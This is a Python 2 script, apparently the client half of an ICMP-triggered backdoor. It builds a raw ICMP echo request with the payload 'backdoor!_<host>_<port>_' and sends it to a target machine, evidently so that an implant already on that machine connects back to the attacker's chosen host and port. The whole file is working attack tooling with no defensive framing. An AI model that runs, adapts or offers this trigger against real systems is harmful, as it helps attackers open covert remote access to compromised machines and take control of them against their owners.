#!/usr/bin/env python

import sys
import socket
import struct
import random
import getopt


def create_socket():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                             socket.getprotobyname('icmp'))

    except socket.error as e:
        if e.errno:
            print "[-] Socket error, errno = %d" % e.errno
            return -1
        raise

    else:
        return sock


def get_checksum(packet):
    sum = 0
    size = (len(packet) / 2) * 2
    count = 0

    while count < size:
        tmp = ord(packet[count + 1]) * 256 + ord(packet[count])
        sum += tmp
        sum &= 0xffffffff
        count += 2

    if size < len(packet):
        sum = sum + ord(packet[len(packet) - 1])
        sum &= 0xffffffff

    sum = (sum >> 16) + (sum & 0xffff)
    sum += (sum >> 16)

    checksum = ~sum
    checksum &= 0xffff

    return ((checksum >> 8) | ((checksum << 8) & 0xff00))


def create_packet(packet_id, host, port):
    data = "backdoor!_" + host + "_" + port + "_\0"
    header = struct.pack('bbHHh', 8, 0, 0, packet_id, 1)
    header = struct.pack('bbHHh', 8, 0,
                         socket.htons(get_checksum(header + data)), packet_id,
                         1)

    # debug
    print "[+] Data : %s" % (data)

    return (header + data)


def sendPacket(sock, host, packet):
    try:
        host = socket.gethostbyname(host)
    except socket.gaierror:
        return

    while packet:
        sent = sock.sendto(packet, (host, 1))
        packet = packet[sent:]

    print "[+] Packet sent!"

    sock.close()


def usage():
    print "usage : python2.7 %s -t <target> -h <host> -p <port>" % sys.argv[0]
    sys.exit()


def main():

    target = ""
    host = ""
    port = ""

    if len(sys.argv) != 7:
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "t:h:p:",
                                   ["target=", "host=", "port="])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for opt, val in opts:
        if opt == '-t':
            target = val

        elif opt in ('-h'):
            host = val

        elif opt in ('-p'):
            port = val

        else:
            # assert False, "unhandled option"
            usage()

    packet_id = int((id(1) * random.random()) % 65535)
    packet = create_packet(packet_id, host, port)
    sock = create_socket()

    if (sock < 0):
        return

    sendPacket(sock, target, packet)


if __name__ == '__main__':
    main()
